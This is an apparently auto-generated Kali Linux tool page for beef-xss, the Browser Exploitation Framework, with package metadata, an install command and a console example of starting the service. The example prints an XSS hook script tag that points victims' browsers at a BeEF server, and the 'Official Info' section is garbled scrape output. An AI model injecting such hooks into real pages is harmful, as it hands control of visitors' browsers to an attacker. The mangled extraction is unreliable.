---
tool_id: beef-xss
title: beef-xss
categories: ["exploitation-tools"]
category_slugs: ["exploitation-tools"]
homepage: https://beefproject.com/
repository: 
version: 0.5.4.0+git20250422-0kali1
architectures: amd64 i386 armhf arm64
license: 
binaries: []
metapackages: ["kali-linux-everything kali-linux-large kali-linux-nethunter kali-tools-exploitation kali-tools-social-engineering kali-tools-web"]
icon: images/beef-xss-logo.svg
source_path: kali-tools\beef-xss\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.798970
---

# Tool: beef-xss (beef-xss)

## Categories
- [exploitation-tools](../exploitation-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://beefproject.com/](https://beefproject.com/) |
| Repository |  |
| Version | 0.5.4.0+git20250422-0kali1 |
| Architectures | amd64 i386 armhf arm64 |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything kali-linux-large kali-linux-nethunter kali-tools-exploitation kali-tools-social-engineering kali-tools-web |
| Icon | images/beef-xss-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/beef-xss
- **PackagesInfo**: |
- **context of the one open door**: the web browser. BeEF will hook one or more web
- ****Installed size**: ** `81.48 MB`
- ****How to install**: ** `sudo apt install beef-xss`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# beef-xss-stop -h
- **[-] Please type a new password for the beef user**: []
- **Loaded**: loaded (/usr/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
- **Active**: inactive (dead)


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## Screenshots

![beef-xss](images/beef-xss.png)

## beef Usage Example

```console
root@kali:~# beef-xss
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - LSB: BeEF
   Loaded: loaded (/etc/init.d/beef-xss; generated)
   Active: active (running) since Sat 2018-11-24 18:44:53 EST; 5s ago
     Docs: man:systemd-sysv-generator(8)
  Process: 3457 ExecStart=/etc/init.d/beef-xss start (code=exited, status=0/SUCCESS)
    Tasks: 5 (limit: 4665)
   Memory: 151.9M
   CGroup: /system.slice/beef-xss.service
           └─3463 ruby /usr/share/beef-xss/beef

Nov 24 18:44:53 kali systemd[1]: Starting LSB: BeEF...
Nov 24 18:44:53 kali systemd[1]: Started LSB: BeEF.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1...
```


## Source
- Path: kali-tools\beef-xss\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.798970
